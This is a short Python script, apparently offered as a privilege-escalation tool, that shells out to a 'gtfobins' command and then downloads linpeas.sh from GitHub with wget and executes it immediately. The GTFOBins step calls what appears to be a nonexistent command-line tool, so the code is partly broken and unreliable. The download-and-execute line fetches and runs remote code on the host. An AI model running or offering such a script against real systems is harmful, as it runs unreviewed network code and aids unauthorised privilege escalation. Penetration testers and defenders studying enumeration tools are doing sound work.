print('CREATED BY ANESTUS UDUME FROM BENTECH SECURITY, TO ESCALATE PRIVILEGE USING LINEPEAS AND GTFOBins')
import subprocess

# Run GTFOBins to search for possible privilege escalation vectors
gtfobins_command = "gtfobins | grep 'SUID\|Capabilities' | cut -d ' ' -f 1 | sort | uniq"
gtfobins_output = subprocess.check_output(gtfobins_command, shell=True)
print("Potential GTFOBins Privilege Escalation Vectors:\n", gtfobins_output.decode("utf-8"))

# Run LinPEAS to perform privilege escalation enumeration
linpeas_command = "wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh"
linpeas_output = subprocess.check_output(linpeas_command, shell=True)
print("LinPEAS Privilege Escalation Enumeration Results:\n", linpeas_output.decode("utf-8"))
